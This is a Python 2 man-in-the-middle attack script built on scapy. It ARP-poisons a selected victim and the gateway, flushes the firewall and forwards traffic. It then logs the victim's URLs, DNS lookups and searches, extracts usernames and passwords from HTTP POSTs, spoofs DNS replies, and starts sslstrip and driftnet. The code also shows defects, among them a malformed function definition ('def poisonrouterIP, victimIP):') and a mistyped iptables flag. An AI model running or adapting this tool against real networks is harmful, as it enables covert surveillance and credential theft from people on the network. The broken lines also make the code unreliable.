#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
conf.checkIPaddr=0
import time
import sys
import threading
import argparse
import sys
import os
import signal
from subprocess import *
import commands
bash=commands.getoutput

#Check if root
if not os.geteuid()==0:
	sys.exit("\nPlease run as root\n")

#Create the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -uv to print all URLs and without truncation.", action="store_true")
parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
parser.add_argument("-ssl", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits", action="store_true")
parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
parser.add_argument("-s", "--search", help="Print victim's search queries", action="store_true")
args = parser.parse_args()

# /dev/null, send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')
#Find the gateway and use it as the router's info
ipr = Popen(['ip', 'route'], stdout=PIPE, stderr=DN)
ipr = ipr.communicate()[0]
routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
routerIP = routerRE.group(1)
IPprefix = routerRE.group(2)
interface = routerRE.group(3)
localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
localMAC = get_if_hwaddr(interface)

#Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

print "Checking the DHCP and DNS server addresses...\n"
dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
		IP(src="0.0.0.0",dst="255.255.255.255")/
		UDP(sport=68,dport=67)/
		BOOTP(chaddr='E3:2E:F4:DD:8R:9A')/
		DHCP(options=[("message-type","discover"),
			("param_req_list",
			chr(DHCPRevOptions["router"][0]),
			chr(DHCPRevOptions["domain"][0]),
			chr(DHCPRevOptions["server_id"][0]),
			chr(DHCPRevOptions["name_server"][0]),
			), "end"]))

ans, unans = srp(dhcp, timeout=6, retry=1)
if ans:
	for s,r in ans:
		DHCPopt = r[0][DHCP].options
		DHCPsrvr = r[0][IP].src
		for x in DHCPopt:
			if 'domain' in x:
				local_domain = x[1]
				pass
			else:
				local_domain = 'None'
			if 'name_server' in x:
				DNSsrvr = x[1]
else:
	print "No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP.\n"
	DNSsrvr = routerIP
	DHCPsrvr = routerIP
	local_domain = 'None'

if args.ipaddress:
	victimIP = args.ipaddress
else:
	ans,unans = arping(IPprefix+'*')
	for s,r in ans:
		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
		print ips
	victimIP = raw_input('\nType victim\'s IP: ')
	print ''

print "[+] Active interface: " + interface
print "[+] Local IP: " + localIP
print "[+] Interface MAC: " + localMAC
print "[+] DHCP server: " + DHCPsrvr
print "[+] DNS server: " + DNSsrvr
print "[+] Local domain: " + local_domain
print "[+] Router IP: " + routerIP
print "[+] Client IP: " + victimIP

def originalMAC(ip):
	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
	for s,r in ans:
		return r.sprintf("%Ether.src%")

def poisonrouterIP, victimIP):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))

def restore(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

def URL(pkt):
	global host, get, post, url

	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
		pkt = repr(pkt[Raw].load)
		try:
			headers, body = pkt.split(r"\r\n\r\n")
		except:
			headers = pkt
			body = ''

		header_lines = headers.split(r"\r\n")
		for l in header_lines:
			searchHost = re.search('[Hh]ost: ', l)
			searchGet = re.search('GET /', l)
			searchPost = re.search('POST /', l)
			if searchHost:
				host = l.split(' ')
				host = host[1]
			if searchGet:
				get = l.split(' ')
				get = get[1]
			if searchPost:
				post = l.split(' ')
				post = post[1]

		if args.post and len(pkt) < 450:
			if body != '':
				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
				if username != [] or password != []:
					print T+'[+] Packet may\'ve been split. Load data:',body+W
					for x in username:
						for u in x:
							if '=' in u:
								print R+u+W
					for y in password:
						for p in y:
							if '=' in p:
								print R+p+W
			if not get:
				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
				if username != [] or password != []:
					print T+'[+] Packet may\'ve been split. Load data:',headers+W
					for x in username:
						for u in x:
							if '=' in u:
								print R+u+W
					for y in password:
						for p in y:
							if '=' in p:
								print R+p+W

		if host and get:
			url = host+get
		if host and post:
			url = host+post
		if url == None:
			return


#The big unsolvable problem is that sometimes sniff() will get a packet (usually from the arp spoofed victim)
#and split it into 2 packets when wireshark sees only one. Consistently from neopets via arpspoof victim. The load
#gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
#http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/

		if args.post and post:
			if body != '':
				print T+'[+] POST:',url,'HTTP POST load:',body+W
				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
				for x in username:
					for u in x:
						if '=' in u:
							print R+u+W
				for y in password:
					for p in y:
						if '=' in p:
							print R+p+W

		if args.urlspy:
			d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
			if any(i in url for i in d):
				return
			if len(url) > 150:
				print url[:149]
			else:
				print url

		if args.verboseURL:
			print url

		if args.search:
			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
			if searched:
				searched = searched.group(3)
				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
				print B + '[+] Searched %s for:' % host,searched + W

	host = None
	get = None
	post = None
	url = None

#def search(url):
#	searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
#	if searched:
#		searched = searched.group(3)
#		searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
#		print B + '[+] Searched %s for:' % c[1],searched + W

def DNSreq(pkt):
	if pkt.haslayer(DNSQR):
		dnsreq = pkt[DNSQR].qname
		print dnsreq

def mkspoof(DNSpkt):
	ip=DNSpkt[IP]
	dnsLayer=DNSpkt[DNS]
#	qr = query or response (0,1), aa=are the nameservers authoritative? (0,1), ad=authenticated data (0,1)
	p = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dnsLayer.id, qr=1, aa=1, qd=dnsLayer.qd, an=DNSRR(rrname=dnsLayer.qd.qname, ttl=10, rdata=localIP))
	return p

class urlspy(threading.Thread):
	def run(self):
#		This is in case you need to test the program without an actual victim
#		sniff(store=0, filter='port 80', prn=URL, iface=interface)
		sniff(store=0, filter='port 80 and host %s' % victimIP, prn=URL, iface=interface)

class dnsspy(threading.Thread):
	def run(self):
		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNSreq, iface=interface)

class dnsspoof(threading.Thread):
	def run(self):
		while 1:
			a=sniff(filter='port 53 or port 80 and host %s' % victimIP, count=1, promisc=1)
			DNSpkt = a[0]
			if not DNSpkt.haslayer(DNSQR):
				continue
			if args.dnsspoof in DNSpkt.qd.qname:
				send(mkspoof(DNSpkt))
				print G + '[+] Spoofed:', DNSpkt.qd.qname + W

class sslstrip(threading.Thread):
	def run(self):
		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
		sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')

class driftnet(threading.Thread):
	def run(self):
		driftnet = bash('xterm -e driftnet -i %s' % interface)

try:
	routerMAC = originalMAC(routerIP)
	print "[+] Router MAC: " + routerMAC
	victimMAC = originalMAC(victimIP)
	print "[+] Victim MAC: " + victimMAC + "\n"
except:
	sys.exit("Could not get MAC addresses")

#Forward packets and flush iptables
ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
ipF = bash('iptables -F')
ipNATF = bash('iptables -t nat F')
ipX = bash('iptables -X')
ipNATX = bash('iptables -t nat -X')
print 'Enabled IP forwarding and flushed the firewall\n'

def main():

	if args.urlspy or args.verboseURL or args.post or args.search:
		ug = urlspy()
		#Make sure the thread closes with the main program on Ctrl-C
		ug.daemon = True
		ug.start()

	if args.dnsspy:
		dt = dnsspy()
		dt.daemon = True
		dt.start()

	if args.driftnet:
		dr = driftnet()
		dr.daemon = True
		dr.start()

	if args.sslstrip:
		ssl = sslstrip()
		ssl.daemon = True
		ssl.start()

	if args.dnsspoof:
		ds = dnsspoof()
		ds.daemon = True
		ds.start()

	def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		restore(routerIP, victimIP, routerMAC, victimMAC)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
		bash('iptables -t nat -F')
		bash('iptables -F')
		bash('iptables -X')
		sys.exit(0)

	signal.signal(signal.SIGINT, signal_handler)


	while 1:

		poison(routerIP, victimIP)
		if not DNSsrvr == routerIP:
			poison(DNSsrvr, victimIP)
		time.sleep(1.5)


if __name__ == "__main__":
	main()
